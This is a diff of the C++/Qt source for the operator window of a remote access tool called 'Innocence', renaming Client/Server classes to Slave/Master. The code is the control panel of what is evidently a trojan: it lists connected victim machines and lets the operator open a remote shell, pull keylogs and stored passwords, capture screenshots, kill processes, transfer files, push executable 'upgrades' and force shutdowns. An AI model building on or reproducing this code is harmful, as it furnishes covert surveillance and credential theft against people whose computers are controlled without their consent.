@@ -1,7 +1,3 @@
-//!
-//!     Kaleidoscalp, all rights reserved.
-//!
-
 #include <string>
 #include <algorithm>
 using namespace std;
@@ -14,27 +10,27 @@ using namespace std;
 #include <blaspheme/Blaspheme.hpp>
 using namespace Network;
 
-#include "Client.hpp"
+#include "Slave.hpp"
 #include "ListeningThread.hpp"
-#include "ServerWindow.hpp"
+#include "MasterWindow.hpp"
 
-namespace TheSleeper
+namespace Master
 { 
-    ServerWindow::ServerWindow(QWidget * parent)
+    MasterWindow::MasterWindow(QWidget * parent)
     :QMainWindow(parent)
     {
-        currentClient = clients.end();
+        currentSlave = slaves.end();
         // Initialisation de l'interface graphique
         setupUi(this);
         createStatusBar();
 
-        connectedClientsView->setModel(&clientsModel);
+        connectedSlavesView->setModel(&slavesModel);
         listener = new ListeningThread(portBox->value(), passEdit->text(), this);
         qRegisterMetaType<Session>("Session");
-        connect(listener, SIGNAL(newClientConnected(Session)), this, SLOT(onNewClient(Session)));
+        connect(listener, SIGNAL(newSlaveConnected(Session)), this, SLOT(onNewSlave(Session)));
         connect(actionAboutQt, SIGNAL(triggered()), this, SLOT(aboutQt()));
         connect(actionAboutInnocence, SIGNAL(triggered()), this, SLOT(about()));
-        connect(actionEditerClient, SIGNAL(triggered()), &edit_client_dialog, SLOT(show()));
+        connect(actionEditerClient, SIGNAL(triggered()), &editSlaveDialog, SLOT(show()));
         
         // configuration du screenshot a distance
         screenLabel->setBackgroundRole(QPalette::Base);
@@ -55,12 +51,12 @@ namespace TheSleeper
         processView->setSelectionMode(QAbstractItemView::SingleSelection);
         processView->setModel(&processModel);
         
-        connectedClientsView->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
+        connectedSlavesView->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
         
         // connexions signals / slots pour le panneau de droite
         connect(disconnectButton,     SIGNAL(clicked()), this, SLOT(onDisconnect()));
         connect(listenButton,         SIGNAL(clicked()), this, SLOT(onListen()));
-        connect(connectedClientsView, SIGNAL(clicked(const QModelIndex&)), this, SLOT(onChangeClient(const QModelIndex &)));
+        connect(connectedSlavesView, SIGNAL(clicked(const QModelIndex&)), this, SLOT(onChangeSlave(const QModelIndex &)));
         connect(actionConfigure,      SIGNAL(triggered()), this, SLOT(configureOptions()));
         connect(actionShutdownServer, SIGNAL(triggered()), this, SLOT(shutdown()));
         connect(actionRebootServer,   SIGNAL(triggered()), this, SLOT(reboot()));
@@ -85,28 +81,28 @@ namespace TheSleeper
         updateDisconnected();
     }
 
-    ServerWindow::~ServerWindow()
+    MasterWindow::~MasterWindow()
     {
         listener->stopListen();
         
         // nettoie tous les objets cores
-        for(ClientPtrList::iterator iter = clients.begin(); iter != clients.end(); iter++)
+        for(SlavePtrList::iterator iter = slaves.begin(); iter != slaves.end(); iter++)
         {
             delete *iter;
         }
     }
 
-    void ServerWindow::aboutQt()
+    void MasterWindow::aboutQt()
     {
         QMessageBox::aboutQt(this);
     }
 
-    void ServerWindow::about()
+    void MasterWindow::about()
     {
         QMessageBox::about(this, tr("About Innocence"), tr("Innocence Project, made by Crunch"));
     }
 
-    void ServerWindow::createStatusBar()
+    void MasterWindow::createStatusBar()
     {
         connectionStatusLabel = new QLabel(tr(" <font color=\"#FF0000\">Offline </font> "));
         connectionStatusLabel->setAlignment(Qt::AlignHCenter);
@@ -126,7 +122,7 @@ namespace TheSleeper
         statusBar()->addWidget(infoPort, 1);
     }
 
-    void ServerWindow::updateConnected(const QString& ip, const QString& port)
+    void MasterWindow::updateConnected(const QString& ip, const QString& port)
     {
         LOG << "GUI enabled";
         tabWidget->setEnabled(true);
@@ -145,7 +141,7 @@ namespace TheSleeper
         disconnectButton->setEnabled(true);
     }
 
-    void ServerWindow::updateDisconnected()
+    void MasterWindow::updateDisconnected()
     {
         LOG << "GUI disabled";
         tabWidget->setEnabled(false);
@@ -159,13 +155,13 @@ namespace TheSleeper
         infoPort->setText(" None ");
         connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Offline </font> "));
         
-        if(!clients.size())
+        if(!slaves.size())
         {
             disconnectButton->setEnabled(false);
         }
     }
 
-    void ServerWindow::onListen()
+    void MasterWindow::onListen()
     {
 		if(listener->isListening())
         {
@@ -179,40 +175,40 @@ namespace TheSleeper
         }
     }
 
-    void ServerWindow::onDisconnect()
+    void MasterWindow::onDisconnect()
     {
         try
         {
-            if(currentClient != clients.end())
+            if(currentSlave != slaves.end())
             {
                 // desactivation de l'interface
                 updateDisconnected();
                 
                 // on le deconnecte proprement
-                (*currentClient)->disconnect();
+                (*currentSlave)->disconnect();
 
                 // on detruit l'objet core
-                delete (*currentClient);
+                delete (*currentSlave);
 
                 // on enleve le pointeur de la liste grace a l'iterateur
-                clients.erase(currentClient);
+                slaves.erase(currentSlave);
                 
-                if(clients.size())
+                if(slaves.size())
                 {
-                    currentClient = clients.begin();
+                    currentSlave = slaves.begin();
                 }
                 else
                 {
-                    currentClient = clients.end();
+                    currentSlave = slaves.end();
                 }
                 
                 // on met a jour le modele
-                clientsModel.set(clients);
+                slavesModel.set(slaves);
                 
                 // on change de client en cours
-                switchClient();
+                switchSlave();
                 
-                if(currentClient == clients.end())
+                if(currentSlave == slaves.end())
                 {
                     LOG << "No slave left";
                     updateDisconnected();
@@ -229,35 +225,35 @@ namespace TheSleeper
         }
     }
 
-    void ServerWindow::onDisconnectedClient()
+    void MasterWindow::onDisconnectedSlave()
     {
         // un des clients s'est deconnecte, mais on ne sais pas lequel
         // pour le savoir on n'utilise : QObject::sender()
-        ClientPtr disconnectedClient = (ClientPtr) QObject::sender();
+        SlavePtr disconnectedSlave = (SlavePtr) QObject::sender();
         
-        LOG << "Slave " + disconnectedClient->getIp().toStdString() + ":" + disconnectedClient->getPort().toStdString() + " is connected";
+        LOG << "Slave " + disconnectedSlave->getIp().toStdString() + ":" + disconnectedSlave->getPort().toStdString() + " is connected";
         
 		// on le deconnecte proprement
-        disconnectedClient->disconnect();
+        disconnectedSlave->disconnect();
 
-        ClientPtrList::iterator iter = std::find(clients.begin(), clients.end(), disconnectedClient);
-        if(iter != clients.end())
+        SlavePtrList::iterator iter = std::find(slaves.begin(), slaves.end(), disconnectedSlave);
+        if(iter != slaves.end())
         {
             // on enleve le pointeur de la liste grace a l'iterateur
-            clients.erase(iter);
+            slaves.erase(iter);
             
             // on met a jour le modele
-            clientsModel.set(clients);
+            slavesModel.set(slaves);
             
-			currentClient = clients.begin();
-            switchClient();
+			currentSlave = slaves.begin();
+            switchSlave();
         }
 
 		// on detruit l'objet core
-        delete disconnectedClient;
+        delete disconnectedSlave;
     }
 	/*
-    void ServerWindow::addAuxClient(Network::TcpClient new_stream, Blaspheme::SessionId id_stream)
+    void MasterWindow::addAuxClient(Network::TcpClient new_stream, Blaspheme::SessionId id_stream)
     {
         // l'ID reçu est l'ID d'un client déjà connecté
         // recherche de l'objet client associé
@@ -277,35 +273,35 @@ namespace TheSleeper
         }
     }
 	*/
-    void ServerWindow::onNewClient(Session session)
+    void MasterWindow::onNewSlave(Session session)
     {
         try
         {
 			LOG << "Creating new slave object";
             // construit un nouvel objet Client que l'on associe au nouveau flux
-            Client * client = new Client(session);
+            Slave * slave = new Slave(session);
 
             // il faudra mettre a jour l'interface si ce client vient a se deconnecter
-            connect(client, SIGNAL(disconnected()), this, SLOT(onDisconnectedClient()));
+            connect(slave, SIGNAL(disconnected()), this, SLOT(onDisconnectedSlave()));
             
             // si l'on active un remote shell, on desactive l'ecoute de nouvelles connexions
-            connect(client, SIGNAL(remoteShellState(bool)), listener, SLOT(setNotListening(bool)));
-            connect(client, SIGNAL(remoteShellState(bool)), this, SLOT(setDisabled(bool)));
+            connect(slave, SIGNAL(remoteShellState(bool)), listener, SLOT(setNotListening(bool)));
+            connect(slave, SIGNAL(remoteShellState(bool)), this, SLOT(setDisabled(bool)));
             
             // ajout du serveur a la liste des serveurs connectes
-            clients.push_back(client);
+            slaves.push_back(slave);
 
             // mise a jour du modele :
-            clientsModel.set(clients);
+            slavesModel.set(slaves);
                 
             // si il n'y avait pas de serveur connectes, on fait en sorte que le premier connecté
             // soit celui que l'on veut controler tout de suite
-            if(clients.size() == 1)
+            if(slaves.size() == 1)
             {
                 disconnectButton->setEnabled(true);
-                current_index = clientsModel.index(0,0);
-                currentClient = clients.begin();
-                switchClient();
+                currentIndex = slavesModel.index(0,0);
+                currentSlave = slaves.begin();
+                switchSlave();
             }
 		}
         catch(std::exception& e)
@@ -318,38 +314,38 @@ namespace TheSleeper
         }
     }
 
-    void ServerWindow::onChangeClient( const QModelIndex & index)
+    void MasterWindow::onChangeSlave( const QModelIndex & index)
     {        
-        if(current_index == index)
+        if(currentIndex == index)
         {
             LOG << "Same slave to control";
         }
         else
         {
-            current_index = index;
-            ClientPtr ptr = clientsModel.get_client(index);
-            ClientPtrList::iterator clientIter = std::find(clients.begin(), clients.end(), ptr);
-            if(clientIter != clients.end())
+            currentIndex = index;
+            SlavePtr ptr = slavesModel.getSlave(index);
+            SlavePtrList::iterator slaveIter = std::find(slaves.begin(), slaves.end(), ptr);
+            if(slaveIter != slaves.end())
             {
-                currentClient = clientIter;
-                switchClient();
+                currentSlave = slaveIter;
+                switchSlave();
             }
         }
     }
 
-    void ServerWindow::switchClient()
+    void MasterWindow::switchSlave()
     {
         LOG << "Switching slave";        
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
             screenProgressBar->setValue(0);
-            remoteFilesView->setModel(&(*currentClient)->getRemoteFileTree());
-            passwords_dialog.setPasswords((*currentClient)->getStoredPasswords());
-            processModel.setStringList((*currentClient)->getProcessList());
-            screenLabel->setPixmap((*currentClient)->getScreen());
+            remoteFilesView->setModel(&(*currentSlave)->getRemoteFileTree());
+            passwordsDialog.setPasswords((*currentSlave)->getStoredPasswords());
+            processModel.setStringList((*currentSlave)->getProcessList());
+            screenLabel->setPixmap((*currentSlave)->getScreen());
             keylogEdit->clear();
-            keylogEdit->append((*currentClient)->getKeylog());
-            updateConnected((*currentClient)->getIp(), (*currentClient)->getPort());
+            keylogEdit->append((*currentSlave)->getKeylog());
+            updateConnected((*currentSlave)->getIp(), (*currentSlave)->getPort());
         }
         else
         {
@@ -358,44 +354,44 @@ namespace TheSleeper
         }
     }
 
-    void ServerWindow::onFailedAuth()
+    void MasterWindow::onFailedAuth()
     {
         LOG << "Authentication failed";
         connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Bad password</font> "));
     }
 
-    void ServerWindow::configureOptions()
+    void MasterWindow::configureOptions()
     {
         
     }
 
-    void ServerWindow::shutdown()
+    void MasterWindow::shutdown()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->shutdown();
+            (*currentSlave)->shutdown();
         }
     }
 
-    void ServerWindow::reboot()
+    void MasterWindow::reboot()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->reboot();
+            (*currentSlave)->reboot();
         }
     }
 
-    void ServerWindow::uninstall()
+    void MasterWindow::uninstall()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->uninstall();
+            (*currentSlave)->uninstall();
         }
     }
 
-    void ServerWindow::upgrade()
+    void MasterWindow::upgrade()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
             // on informe l'utilisateur que c'est une manoeuvre risquée
             QMessageBox::information(this, windowTitle(),tr("Warning, you must select a valid Innocence slave installer"));
@@ -404,77 +400,77 @@ namespace TheSleeper
             QString fileName = QFileDialog::getOpenFileName(this, tr("Open File"),"C:\\",tr("Executable (*.exe)"));
             if(fileName.size())
             {
-                (*currentClient)->upgrade(fileName);
+                (*currentSlave)->upgrade(fileName);
             }
         }
     }
 
-    void ServerWindow::remoteShutdown()
+    void MasterWindow::remoteShutdown()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->remoteShutdown();
+            (*currentSlave)->remoteShutdown();
         }
     }
 
-    void ServerWindow::remoteReboot()
+    void MasterWindow::remoteReboot()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->remoteReboot();
+            (*currentSlave)->remoteReboot();
         }
     }
 
-    void ServerWindow::remoteHibernate()
+    void MasterWindow::remoteHibernate()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->remoteHibernate();
+            (*currentSlave)->remoteHibernate();
         }
     }
 
-    void ServerWindow::remoteLogout()
+    void MasterWindow::remoteLogout()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->remoteLogout();
+            (*currentSlave)->remoteLogout();
         }
     }
 
-    void ServerWindow::remoteShell()
+    void MasterWindow::remoteShell()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->remoteShell();
+            (*currentSlave)->remoteShell();
         }
     }
 
-    void ServerWindow::getPasswords()
+    void MasterWindow::getPasswords()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-			passwords_dialog.setPasswords((*currentClient)->getStoredPasswords());
-            passwords_dialog.show();
+			passwordsDialog.setPasswords((*currentSlave)->getStoredPasswords());
+            passwordsDialog.show();
         }
     }
 
-    void ServerWindow::updateProcessList()
+    void MasterWindow::updateProcessList()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->updateProcessList();
-            processModel.setStringList((*currentClient)->getProcessList());
+            (*currentSlave)->updateProcessList();
+            processModel.setStringList((*currentSlave)->getProcessList());
         }
     }
 
-    void ServerWindow::killProcess()
+    void MasterWindow::killProcess()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
             QModelIndex index = processView->currentIndex();
             if(index.isValid())
             {
-                (*currentClient)->killProcess(processModel.data(index, Qt::DisplayRole).toString());
+                (*currentSlave)->killProcess(processModel.data(index, Qt::DisplayRole).toString());
 
                 // temps d'attente pendant la mise a jour de la liste...
                 QThread::currentThread()->wait(500);
@@ -484,24 +480,24 @@ namespace TheSleeper
         }
     }
 
-    void ServerWindow::updateScreen()
+    void MasterWindow::updateScreen()
     {
 		updateScreenButton->setEnabled(false);
         screenProgressBar->setValue(0);
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            (*currentClient)->updateScreen((int)jpegQualitySpinBox->value(), screenProgressBar);		
+            (*currentSlave)->updateScreen((int)jpegQualitySpinBox->value(), screenProgressBar);		
         }
 
-		if(currentClient != clients.end())
+		if(currentSlave != slaves.end())
 		{
 			screenLabel->clear();
-            screenLabel->setPixmap((*currentClient)->getScreen());
+            screenLabel->setPixmap((*currentSlave)->getScreen());
 		}
 		updateScreenButton->setEnabled(true);
     }
 
-    void ServerWindow::saveScreen()
+    void MasterWindow::saveScreen()
     {
         const QPixmap * screenmap = screenLabel->pixmap();
         if(screenmap)
@@ -512,19 +508,19 @@ namespace TheSleeper
         }
     }
 
-    void ServerWindow::showKeylog()
+    void MasterWindow::showKeylog()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
             updateLogButton->setEnabled(false);
-            (*currentClient)->updateKeylog(keylogProgressBar);
+            (*currentSlave)->updateKeylog(keylogProgressBar);
             keylogEdit->clear();
-            keylogEdit->append((*currentClient)->getKeylog());
+            keylogEdit->append((*currentSlave)->getKeylog());
             updateLogButton->setEnabled(true);
         }
     }
 
-    void ServerWindow::saveKeylog()
+    void MasterWindow::saveKeylog()
     {
         if(keylogEdit->toPlainText().toStdString().size())
         {
@@ -539,20 +535,20 @@ namespace TheSleeper
         }
     }
 
-    void ServerWindow::browseRemoteFiles(QModelIndex index)
+    void MasterWindow::browseRemoteFiles(QModelIndex index)
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
-            if(!(*currentClient)->browseFiles(index))
+            if(!(*currentSlave)->browseFiles(index))
             {
                 QMessageBox::information(0, "Theclient","Can't list directory");
             }
         }
     }
 
-    void ServerWindow::startDownload()
+    void MasterWindow::startDownload()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
             // si un fichier a été sélectionné sur le serveur
             if(remoteFilesView->currentIndex() == QModelIndex())
@@ -561,7 +557,7 @@ namespace TheSleeper
                 return;
             }
 
-            QString sourceFileName = (*currentClient)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
+            QString sourceFileName = (*currentSlave)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
             if(sourceFileName[sourceFileName.size()-1] == '\\')
             {
                 QMessageBox::information(0, "TheSleeper",tr("Please select a source file instead of source directory"));
@@ -580,15 +576,15 @@ namespace TheSleeper
                 return;
             }
             
-            QString sourceFilePath = (*currentClient)->getRemotePath(remoteFilesView->currentIndex());
+            QString sourceFilePath = (*currentSlave)->getRemotePath(remoteFilesView->currentIndex());
             QString destinationFilePath = localFilesModel.filePath(localFilesView->currentIndex()) + "\\" + sourceFileName;    
-            (*currentClient)->startDownload(sourceFilePath, destinationFilePath, transferProgressBar);
+            (*currentSlave)->startDownload(sourceFilePath, destinationFilePath, transferProgressBar);
         }
     }
 
-    void ServerWindow::startUpload()
+    void MasterWindow::startUpload()
     {
-        if(currentClient != clients.end())
+        if(currentSlave != slaves.end())
         {
             if(localFilesModel.isDir(localFilesView->currentIndex()))
             {
@@ -596,7 +592,7 @@ namespace TheSleeper
                 return;
             }
             
-            QString destinationFileName = (*currentClient)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
+            QString destinationFileName = (*currentSlave)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
             if(destinationFileName[destinationFileName.size()-1] != '\\')
             {
                 QMessageBox::information(0, "TheSleeper",tr("Please select a destination directory"));
@@ -604,9 +600,9 @@ namespace TheSleeper
             }
             
             QString sourceFilePath = localFilesModel.filePath(localFilesView->currentIndex());
-            QString destinationFilePath = (*currentClient)->getRemotePath(remoteFilesView->currentIndex()) + localFilesModel.fileName(localFilesView->currentIndex());;
-            (*currentClient)->startUpload(sourceFilePath, destinationFilePath, transferProgressBar);
+            QString destinationFilePath = (*currentSlave)->getRemotePath(remoteFilesView->currentIndex()) + localFilesModel.fileName(localFilesView->currentIndex());;
+            (*currentSlave)->startUpload(sourceFilePath, destinationFilePath, transferProgressBar);
         }
     }
     
-} /* TheSleeper */
+} // Master
